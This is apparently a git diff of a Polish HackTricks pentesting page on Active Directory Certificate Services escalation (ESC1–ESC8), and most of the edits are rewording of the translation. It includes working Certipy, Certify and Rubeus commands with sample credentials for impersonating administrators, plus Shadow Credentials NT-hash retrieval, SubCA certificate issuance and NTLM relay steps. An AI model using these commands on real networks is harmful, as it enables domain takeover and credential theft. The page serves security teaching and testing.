@@ -10,7 +10,7 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
 
@@ -30,14 +30,14 @@ Inne sposoby wsparcia HackTricks:
 
 ### Błędnie skonfigurowane szablony certyfikatów - ESC1 Wyjaśnione
 
-* **Uprawnienia do zapisu są przyznawane nisko uprzywilejowanym użytkownikom przez Enterprise CA.**
+* **Prawa do zapisu są przyznawane nisko uprzywilejowanym użytkownikom przez Enterprise CA.**
 * **Zgoda menedżera nie jest wymagana.**
 * **Nie są wymagane podpisy od upoważnionego personelu.**
-* **Deskryptory zabezpieczeń na szablonach certyfikatów są zbyt liberalne, pozwalając nisko uprzywilejowanym użytkownikom uzyskać uprawnienia do zapisu.**
+* **Deskryptory zabezpieczeń na szablonach certyfikatów są zbyt liberalne, pozwalając nisko uprzywilejowanym użytkownikom uzyskać prawa do zapisu.**
 * **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
-* Identyfikatory Extended Key Usage (EKU) takie jak Autoryzacja klienta (OID 1.3.6.1.5.5.7.3.2), Autoryzacja klienta PKINIT (1.3.6.1.5.2.3.4), Logowanie kartą inteligentną (OID 1.3.6.1.4.1.311.20.2.2), Dla dowolnego celu (OID 2.5.29.37.0) lub brak EKU (SubCA) są uwzględnione.
+* Identyfikatory Extended Key Usage (EKU) takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA) są uwzględnione.
 * **Możliwość dołączenia subjectAltName w żądaniu podpisania certyfikatu (CSR) jest dozwolona przez szablon:**
-* Active Directory (AD) priorytetowo traktuje subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR, można poprosić o certyfikat do podszywania się za dowolnego użytkownika (np. administratora domeny). Czy żądający może określić SAN jest wskazane w obiekcie AD szablonu certyfikatu za pomocą właściwości `mspki-certificate-name-flag`. Ta właściwość jest bitem maski, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala na określenie SAN przez żądającego.
+* Active Directory (AD) priorytetowo traktuje subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR, certyfikat można żądać w celu podszywania się za dowolnego użytkownika (np. administratora domeny). Czy żądający może określić SAN jest wskazane w obiekcie AD szablonu certyfikatu za pomocą właściwości `mspki-certificate-name-flag`. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala na określenie SAN przez żądającego.
 
 {% hint style="danger" %}
 Konfiguracja ta pozwala nisko uprzywilejowanym użytkownikom żądać certyfikatów z dowolnym SAN wyborem, umożliwiając uwierzytelnianie jako dowolny podmiot domeny za pośrednictwem Kerberos lub SChannel.
@@ -45,7 +45,7 @@ Konfiguracja ta pozwala nisko uprzywilejowanym użytkownikom żądać certyfikat
 
 Ta funkcja jest czasami włączana w celu wsparcia generowania certyfikatów HTTPS lub hosta na żywo przez produkty lub usługi wdrożeniowe, lub z powodu braku zrozumienia.
 
-Zauważono, że tworzenie certyfikatu z tą opcją powoduje ostrzeżenie, czego nie ma w przypadku duplikowania istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, który ma włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) i następnie modyfikacji w celu uwzględnienia OID uwierzytelniania.
+Zauważono, że utworzenie certyfikatu z tą opcją powoduje ostrzeżenie, czego nie ma w przypadku duplikowania istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, który ma włączoną `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) i następnie zmodyfikowania go w celu uwzględnienia OID uwierzytelniania.
 
 ### Nadużycie
 
@@ -66,7 +66,7 @@ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.lo
 ```
 Windows binaries "Certreq.exe" & "Certutil.exe" można użyć do wygenerowania pliku PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-Wyliczenie szablonów certyfikatów w schemacie konfiguracyjnym lasu AD, w szczególności tych nie wymagających zatwierdzenia ani podpisów, posiadających uwierzytelnienie klienta lub EKU logowania kartą inteligentną, oraz z włączoną flagą `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, wykonując następujące zapytanie LDAP:
+Wyliczenie szablonów certyfikatów w schemacie konfiguracji AD Forest, w szczególności tych nie wymagających zatwierdzenia ani podpisów, posiadających uwierzytelnienie klienta lub EKU logowania kartą inteligentną, oraz z włączoną flagą `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, uruchamiając następujące zapytanie LDAP:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
@@ -77,16 +77,16 @@ Wyliczenie szablonów certyfikatów w schemacie konfiguracyjnym lasu AD, w szcze
 Drugi scenariusz nadużycia to wariacja pierwszego:
 
 1. Uprawnienia do zapisywania są przyznawane nisko uprzywilejowanym użytkownikom przez Enterprise CA.
-2. Wymaganie zgody menedżera jest wyłączone.
+2. Wymóg zatwierdzenia przez kierownika jest wyłączony.
 3. Pominięto konieczność autoryzowanych podpisów.
-4. Zbyt liberalny deskryptor zabezpieczeń na szablonie certyfikatu przyznaje uprawnienia do zapisywania certyfikatów nisko uprzywilejowanym użytkownikom.
-5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierał dowolne przeznaczenie EKU lub brak EKU.**
+4. Nadmiernie liberalny deskryptor zabezpieczeń na szablonie certyfikatu przyznaje uprawnienia do zapisywania certyfikatów nisko uprzywilejowanym użytkownikom.
+5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierał dowolny cel EKU lub brak EKU.**
 
-**Dowolne przeznaczenie EKU** pozwala na uzyskanie certyfikatu przez atakującego do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu, itp. Ta sama **technika używana w ESC3** może być wykorzystana do wykorzystania tego scenariusza.
+**Dowolny cel EKU** pozwala na uzyskanie certyfikatu przez atakującego do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu, itp. Ta sama **technika używana w ESC3** może być wykorzystana do wykorzystania tego scenariusza.
 
 Certyfikaty **bez EKU**, które działają jako certyfikaty podrzędne CA, mogą być wykorzystane do **dowolnego celu** i mogą **również służyć do podpisywania nowych certyfikatów**. Dlatego atakujący mógłby określić dowolne EKU lub pola w nowych certyfikatach, korzystając z certyfikatu podrzędnego CA.
 
-Jednakże, nowe certyfikaty utworzone do **uwierzytelniania domeny** nie będą działać, jeśli certyfikat podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Niemniej jednak, atakujący nadal może tworzyć **nowe certyfikaty z dowolnym EKU** i arbitralnymi wartościami certyfikatu. Mogą one potencjalnie **być wykorzystane** do szerokiego zakresu celów (np. podpisywania kodu, uwierzytelniania serwera, itp.) i mogą mieć znaczące implikacje dla innych aplikacji w sieci, takich jak SAML, AD FS, czy IPSec.
+Jednakże nowe certyfikaty utworzone do **uwierzytelniania domeny** nie będą działać, jeśli certyfikat podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest domyślnym ustawieniem. Niemniej jednak, atakujący nadal może tworzyć **nowe certyfikaty z dowolnym EKU** i arbitralnymi wartościami certyfikatu. Mogą one potencjalnie **być wykorzystane** do szerokiego zakresu celów (np. podpisywania kodu, uwierzytelniania serwera, itp.) i mogą mieć znaczące implikacje dla innych aplikacji w sieci, takich jak SAML, AD FS, czy IPSec.
 
 Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:
 ```
@@ -113,7 +113,7 @@ Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** **inn
 **Wymagania 2:**
 
 * CA przedsiębiorstwa udziela uprawnień do zapisu nisko uprzywilejowanym użytkownikom.
-* Zgoda menedżera jest pomijana.
+* Zgoda menedżera jest obejśnięta.
 * Wersja schematu szablonu to albo 1, albo przekracza 2, i określa Wymaganie Wydania Polityki Aplikacji, które wymaga EKU agenta żądania certyfikatu.
 * EKU zdefiniowane w szablonie certyfikatu umożliwia uwierzytelnianie domeny.
 * Ograniczenia dla agentów zapisu nie są stosowane w CA.
@@ -134,15 +134,15 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-**Użytkownicy**, którzy mają prawo **uzyskać** certyfikat **agenta do zapisu**, szablony, w których agenci do zapisu mają prawo do zapisu, oraz **konta**, w imieniu których agent do zapisu może działać, mogą być ograniczeni przez przedsiębiorstwowe CA. Można to osiągnąć, otwierając `certsrc.msc` **snap-in**, **klikając prawym przyciskiem myszy na CA**, **klikając Właściwości**, a następnie **przechodząc** do karty "Agenci do zapisu".
+**Użytkownicy**, którzy mają prawo **uzyskać** certyfikat **agenta** do rejestracji, szablony, w których **agenta** rejestracji można zarejestrować, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczone przez przedsiębiorstwo CAs. Można to osiągnąć, otwierając `certsrc.msc` **snap-in**, **klikając prawym przyciskiem myszy na CA**, **klikając Właściwości**, a następnie **przechodząc** do karty "Agenci rejestracji".
 
-Jednak zauważono, że **domyślne** ustawienie dla CA to "Nie ograniczaj agentów do zapisu". Gdy administratorzy włączają ograniczenie agentów do zapisu, ustawiając je na "Ogranicz agentów do zapisu", domyślna konfiguracja pozostaje bardzo liberalna. Pozwala to **Wszystkim** uzyskać dostęp do zapisu we wszystkich szablonach jako ktokolwiek.
+Jednak zauważono, że **domyślne** ustawienie dla CAs to "Nie ograniczaj agentów rejestracji". Gdy ograniczenie agentów rejestracji jest włączone przez administratorów, ustawienie go na "Ogranicz agentów rejestracji", domyślna konfiguracja pozostaje bardzo liberalna. Pozwala to **Wszystkim** uzyskać dostęp do rejestracji we wszystkich szablonach jako ktokolwiek.
 
-## Kontrola dostępu do szablonów certyfikatów podatna na ataki - ESC4
+## Narażona kontrola dostępu do szablonu certyfikatu - ESC4
 
 ### **Wyjaśnienie**
 
-**Deskryptor zabezpieczeń** na **szablonach certyfikatów** określa **uprawnienia** poszczególnych **podmiotów AD** dotyczące szablonu.
+**Deskryptor zabezpieczeń** na **szablonach certyfikatów** określa **uprawnienia** konkretnych **podmiotów AD** dotyczące szablonu.
 
 Jeśli **atakujący** posiada wymagane **uprawnienia** do **zmiany** **szablonu** i **wprowadzenia** jakichkolwiek **wykorzystywanych błędów konfiguracyjnych** opisanych w **poprzednich sekcjach**, ułatwione może być eskalacja uprawnień.
 
@@ -150,17 +150,17 @@ Znaczące uprawnienia dotyczące szablonów certyfikatów obejmują:
 
 * **Właściciel:** Zapewnia kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
 * **Pełna kontrola:** Umożliwia pełną kontrolę nad obiektem, w tym możliwość zmiany dowolnych atrybutów.
-* **Zapisz właściciela:** Pozwala na zmianę właściciela obiektu na podmiot znajdujący się pod kontrolą atakującego.
-* **ZapiszDacl:** Umożliwia dostosowanie kontroli dostępu, potencjalnie przyznając atakującemu pełną kontrolę.
+* **Zapisz właściciela:** Umożliwia zmianę właściciela obiektu na podmiot znajdujący się pod kontrolą atakującego.
+* **ZapiszDacl:** Pozwala na dostosowanie kontroli dostępu, potencjalnie przyznając atakującemu pełną kontrolę.
 * **ZapiszWłaściwość:** Uprawnia do edycji dowolnych właściwości obiektu.
 
 ### Nadużycie
 
-Przykład privesc podobny do poprzedniego:
+Przykład privesc jak poprzedni:
 
 <figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 występuje, gdy użytkownik ma uprawnienia do zapisu na szablonie certyfikatu. Może to na przykład zostać wykorzystane do nadpisania konfiguracji szablonu certyfikatu, aby uczynić szablon podatnym na ESC1.
+ESC4 to sytuacja, gdy użytkownik ma uprawnienia do zapisu w szablonie certyfikatu. Może to na przykład zostać wykorzystane do nadpisania konfiguracji szablonu certyfikatu, aby uczynić szablon podatnym na ESC1.
 
 Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowy krawędź `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem również ten atak, który jest znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto mały podgląd polecenia `shadow auto` z Certipy do pobrania hasha NT ofiary.
 ```bash
@@ -177,7 +177,7 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
-## Podatny kontroler dostępu do obiektów PKI - ESC5
+## Podatny dostęp do kontroli dostępu do obiektów PKI - ESC5
 
 ### Wyjaśnienie
 
@@ -185,7 +185,7 @@ Rozległa sieć powiązań oparta na listach kontroli dostępu (ACL), która obe
 
 * Obiekt komputera AD serwera CA, który może zostać skompromitowany poprzez mechanizmy takie jak S4U2Self lub S4U2Proxy.
 * Serwer RPC/DCOM serwera CA.
-* Dowolny obiekt potomny AD lub kontener w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ta ścieżka obejmuje, ale nie ogranicza się do, kontenerów i obiektów takich jak kontener Szablonów Certyfikatów, kontener Certyfikujących Urzędów, obiekt NTAuthCertificates i Kontener Usług Enrollments.
+* Dowolny obiekt potomny AD lub kontener w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ta ścieżka obejmuje, ale nie ogranicza się do kontenerów i obiektów takich jak kontener Szablonów Certyfikatów, kontener Certyfikujących Urzędów, obiekt NTAuthCertificates i kontener Usług Enrollments.
 
 Bezpieczeństwo systemu PKI może zostać naruszone, jeśli nisko uprzywilejowany atakujący zdobędzie kontrolę nad którymkolwiek z tych kluczowych komponentów.
 
@@ -193,7 +193,7 @@ Bezpieczeństwo systemu PKI może zostać naruszone, jeśli nisko uprzywilejowan
 
 ### Wyjaśnienie
 
-Temat omawiany w [**poście Akademii CQure**](https://cqureacademy.com/blog/enhanced-key-usage) dotyczy również implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, jak to opisano w dokumentacji firmy Microsoft. Ta konfiguracja, gdy jest aktywowana na Urzędzie Certyfikacyjnym (CA), pozwala na uwzględnienie **wartości zdefiniowanych przez użytkownika** w **alternatywnej nazwie podmiotu** dla **dowolnego żądania**, w tym tych skonstruowanych z Active Directory®. W rezultacie ta możliwość pozwala **intruzowi** na zapisanie się poprzez **dowolny szablon** ustawiony dla **uwierzytelniania** domeny—szczególnie tych otwartych dla rejestracji przez **nieuprzywilejowanych** użytkowników, takich jak standardowy szablon Użytkownika. W rezultacie certyfikat może być zabezpieczony, umożliwiając intruzowi uwierzytelnienie jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.
+Temat omawiany w [**poście Akademii CQure**](https://cqureacademy.com/blog/enhanced-key-usage) dotyczy również implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, jak to opisano w dokumentacji firmy Microsoft. Ta konfiguracja, gdy jest aktywowana na Urzędzie Certyfikacyjnym (CA), pozwala na uwzględnienie **wartości zdefiniowanych przez użytkownika** w **alternatywnej nazwie podmiotu** dla **dowolnego żądania**, w tym tych skonstruowanych z Active Directory®. W rezultacie ta możliwość pozwala **intruzowi** na zapisanie się poprzez **dowolny szablon** ustawiony dla **uwierzytelniania** domeny—szczególnie tych otwartych dla zapisu przez **nieuprzywilejowanych** użytkowników, takich jak standardowy szablon Użytkownika. W rezultacie certyfikat może być zabezpieczony, umożliwiając intruzowi uwierzytelnienie się jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.
 
 **Uwaga**: Sposób dodawania **alternatywnych nazw** do żądania certyfikatu (CSR), poprzez argument `-attrib "SAN:"` w `certreq.exe` (nazywany „Pary Wartości Nazw”), prezentuje **kontrast** w porównaniu ze strategią eksploatacji SAN w ESC1. Tutaj różnica polega na **enkapsulacji informacji o koncie**—w atrybucie certyfikatu, a nie w rozszerzeniu.
 
@@ -207,7 +207,7 @@ Ta operacja wykorzystuje w zasadzie **zdalny dostęp do rejestru**, dlatego alte
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
-Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) są zdolne do wykrywania tej błędnej konfiguracji i jej wykorzystania:
+Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykryć tę błędną konfigurację i ją wykorzystać:
 ```bash
 # Detect vulnerabilities, including this one
 Certify.exe find
@@ -226,7 +226,7 @@ certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJ
 ```
 {% hint style="warning" %}
 Po aktualizacjach zabezpieczeń z maja 2022 r. nowo wydane **certyfikaty** będą zawierać **rozszerzenie zabezpieczeń**, które zawiera **właściwość `objectSid` żądającego**. Dla ESC1 SID ten jest pochodną określonego SAN. Jednakże dla **ESC6** SID odzwierciedla **`objectSid` żądającego**, a nie SAN.\
-Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Słabe mapowania certyfikatów), które priorytetowo traktuje **SAN nad nowym rozszerzeniem zabezpieczeń**.
+Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Słabe mapowania certyfikatów), który priorytetowo traktuje **SAN nad nowym rozszerzeniem zabezpieczeń**.
 {% endhint %}
 
 ## Wrażliwa kontrola dostępu do certyfikatu CA - ESC7
@@ -235,15 +235,15 @@ Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Słabe 
 
 #### Wyjaśnienie
 
-Kontrola dostępu do certyfikatu CA jest utrzymywana poprzez zestaw uprawnień regulujących działania CA. Te uprawnienia można zobaczyć, przechodząc do `certsrv.msc`, klikając prawym przyciskiem CA, wybierając właściwości, a następnie przechodząc do karty Zabezpieczenia. Dodatkowo uprawnienia można wyliczyć, używając modułu PSPKI za pomocą poleceń takich jak:
+Kontrola dostępu do certyfikatu CA jest utrzymywana poprzez zestaw uprawnień regulujących działania CA. Te uprawnienia można zobaczyć, przechodząc do `certsrv.msc`, klikając prawym przyciskiem CA, wybierając właściwości, a następnie przechodząc do karty Zabezpieczenia. Dodatkowo uprawnienia można wyliczyć za pomocą modułu PSPKI za pomocą poleceń takich jak:
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
-To zapewnia wgląd w główne uprawnienia, mianowicie **`ManageCA`** i **`ManageCertificates`**, które korelują z rolami "administratora CA" i "Menedżera certyfikatów" odpowiednio.
+To zapewnia wgląd w podstawowe uprawnienia, mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające rolom "administratora CA" i "Menedżera certyfikatów" odpowiednio.
 
 #### Nadużycie
 
-Posiadanie uprawnień **`ManageCA`** w władzy certyfikatu umożliwia podmiotowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określenie SAN w dowolnym szablonie, co jest istotnym aspektem eskalacji domeny.
+Posiadanie uprawnień **`ManageCA`** w instytucji certyfikującej umożliwia podmiotowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określenie SAN w dowolnym szablonie, co jest istotnym aspektem eskalacji domeny.
 
 Uproszczenie tego procesu jest osiągalne poprzez użycie polecenia **Enable-PolicyModuleFlag** w PSPKI, umożliwiające modyfikacje bez bezpośredniej interakcji z interfejsem GUI.
 
@@ -270,7 +270,7 @@ Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 #### Wyjaśnienie
 
 {% hint style="warning" %}
-W **poprzednim ataku** wykorzystano uprawnienia **`Manage CA`** do **włączenia** flagi **EDITF\_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia ataku **ESC6**, ale nie będzie to miało żadnego efektu do momentu ponownego uruchomienia usługi CA (`CertSvc`). Gdy użytkownik ma prawo dostępu `Manage CA`, ma również uprawnienie do **ponownego uruchomienia usługi**. Jednakże **nie oznacza to, że użytkownik może zdalnie uruchomić usługę**. Ponadto **ESC6** może nie działać od razu w większości zaktualizowanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.
+W **poprzednim ataku** wykorzystano uprawnienia **`Manage CA`** do **włączenia** flagi **EDITF\_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia ataku **ESC6**, ale nie będzie to miało żadnego efektu do czasu ponownego uruchomienia usługi CA (`CertSvc`). Gdy użytkownik ma prawo dostępu `Manage CA`, ma również uprawnienie do **ponownego uruchomienia usługi**. Jednakże **nie oznacza to, że użytkownik może zdalnie uruchomić usługę**. Ponadto **ESC6** może nie działać od razu w większości zaktualizowanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.
 {% endhint %}
 
 Dlatego przedstawiony jest tutaj kolejny atak.
@@ -304,7 +304,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
-Jeśli spełniliśmy wymagane warunki dla tego ataku, możemy rozpocząć od **żądania certyfikatu opartego na szablonie `SubCA`**.
+Jeśli spełniliśmy wymagania wstępne dla tego ataku, możemy rozpocząć od **żądania certyfikatu opartego na szablonie `SubCA`**.
 
 **To żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zapiszemy identyfikator żądania.
 ```bash
@@ -318,7 +318,7 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-Z naszymi **`Zarządzaj CA` i `Zarządzaj Certyfikatami`**, możemy następnie **wydać nieudany certyfikat** żądanie za pomocą polecenia `ca` i parametru `-issue-request <ID żądania>`.
+Z naszymi **`Zarządzaj CA` i `Zarządzaj Certyfikatami`**, możemy następnie **wydać nieudane żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <ID żądania>`.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -342,13 +342,13 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 ### Wyjaśnienie
 
 {% hint style="info" %}
-W środowiskach, gdzie **zainstalowano AD CS**, jeśli istnieje **podatny punkt końcowy do zapisu w sieci Web** i co najmniej jeden **szablon certyfikatu jest opublikowany**, który pozwala na **zapisanie komputera domenowego i uwierzytelnienie klienta** (takiego jak domyślny szablon **`Machine`**), staje się możliwe, że **dowolny komputer z aktywną usługą spoolera może zostać skompromitowany przez atakującego**!
+W środowiskach, gdzie **zainstalowano AD CS**, jeśli istnieje **podatny punkt końcowy do rejestracji internetowej** i co najmniej jeden **szablon certyfikatu jest opublikowany**, który pozwala na **rejestrację komputera domenowego i uwierzytelnianie klienta** (tak jak domyślny szablon **`Machine`**), staje się możliwe, że **dowolny komputer z usługą spoolera aktywną może zostać skompromitowany przez atakującego**!
 {% endhint %}
 
-Kilka **metod zapisu opartych na HTTP** jest obsługiwanych przez AD CS, udostępnianych poprzez dodatkowe role serwera, które administratorzy mogą zainstalować. Te interfejsy do zapisu certyfikatów opartych na HTTP są podatne na **ataki NTLM relay**. Atakujący z **skompromitowanego komputera może podszyć się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów sieci Web, aby **żądać certyfikatu uwierzytelnienia klienta, korzystając z szablonów certyfikatów `User` lub `Machine`**.
+Kilka **metod rejestracji opartych na HTTP** jest obsługiwanych przez AD CS, udostępniane poprzez dodatkowe role serwera, które administratorzy mogą zainstalować. Te interfejsy do rejestracji certyfikatów opartych na HTTP są podatne na **ataki NTLM relay**. Atakujący, z **skompromitowanego komputera, może podszyć się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów sieciowych, aby **żądać certyfikatu uwierzytelniania klienta, korzystając z szablonów certyfikatów `User` lub `Machine`**.
 
-* **Interfejs zapisu sieci Web** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`), domyślnie obsługuje tylko protokół HTTP, co nie zapewnia ochrony przed atakami NTLM relay. Dodatkowo, wyraźnie zezwala tylko na uwierzytelnianie NTLM za pomocą nagłówka HTTP Authorization, co uniemożliwia stosowanie bardziej bezpiecznych metod uwierzytelniania, takich jak Kerberos.
-* **Usługa Zapisu Certyfikatów** (CES), **Usługa Polityki Zapisu Certyfikatów** (CEP) i **Usługa Zapisu Urządzeń Sieciowych** (NDES) domyślnie obsługują uwierzytelnianie negocjacyjne za pomocą nagłówka HTTP Authorization. Uwierzytelnianie negocjacyjne **obsługuje zarówno** Kerberos, jak i **NTLM**, umożliwiając atakującemu **zmniejszenie do uwierzytelniania NTLM** podczas ataków relay. Chociaż te usługi sieci Web domyślnie obsługują HTTPS, samo HTTPS **nie chroni przed atakami NTLM relay**. Ochrona przed atakami NTLM relay dla usług HTTPS jest możliwa tylko wtedy, gdy HTTPS jest połączone z wiązaniem kanału. Niestety, AD CS nie aktywuje Rozszerzonej Ochrony dla Uwierzytelniania w IIS, co jest wymagane do wiązania kanału.
+* **Interfejs rejestracji internetowej** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`), domyślnie obsługuje tylko protokół HTTP, co nie zapewnia ochrony przed atakami NTLM relay. Dodatkowo, wyraźnie zezwala tylko na uwierzytelnianie NTLM za pomocą nagłówka HTTP Authorization, co uniemożliwia stosowanie bardziej bezpiecznych metod uwierzytelniania, takich jak Kerberos.
+* **Usługa Rejestracji Certyfikatów** (CES), **Usługa Polityki Rejestracji Certyfikatów** (CEP) i **Usługa Rejestracji Urządzeń Sieciowych** (NDES) domyślnie obsługują uwierzytelnianie negocjowane za pomocą nagłówka HTTP Authorization. Uwierzytelnianie negocjowane **obsługuje zarówno** Kerberos, jak i **NTLM**, pozwalając atakującemu na **zmniejszenie do uwierzytelniania NTLM** podczas ataków relay. Chociaż te usługi sieciowe domyślnie obsługują HTTPS, samo HTTPS **nie chroni przed atakami NTLM relay**. Ochrona przed atakami NTLM relay dla usług HTTPS jest możliwa tylko wtedy, gdy HTTPS jest połączone z wiązaniem kanału. Niestety, AD CS nie aktywuje Rozszerzonej Ochrony dla Uwierzytelniania w IIS, co jest wymagane do wiązania kanałów.
 
 Powszechnym **problemem** z atakami NTLM relay jest **krótki czas trwania sesji NTLM** i niemożność atakującego interakcji z usługami, które **wymagają podpisu NTLM**.
 
@@ -372,7 +372,7 @@ Certify.exe cas
 ```
 <figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
-Właściwość `msPKI-Enrollment-Servers` jest używana przez przedsiębiorstwowe władze certyfikujące (CAs) do przechowywania punktów końcowych usługi zgłaszania certyfikatów (CES). Te punkty końcowe można analizować i wyświetlać, korzystając z narzędzia **Certutil.exe**:
+Właściwość `msPKI-Enrollment-Servers` jest używana przez przedsiębiorstwowe władze certyfikujące (CAs) do przechowywania punktów końcowych Usługi Enrollingu Certyfikatów (CES). Te punkty końcowe można analizować i wyświetlać, korzystając z narzędzia **Certutil.exe**:
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
@@ -400,9 +400,9 @@ execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <
 ```
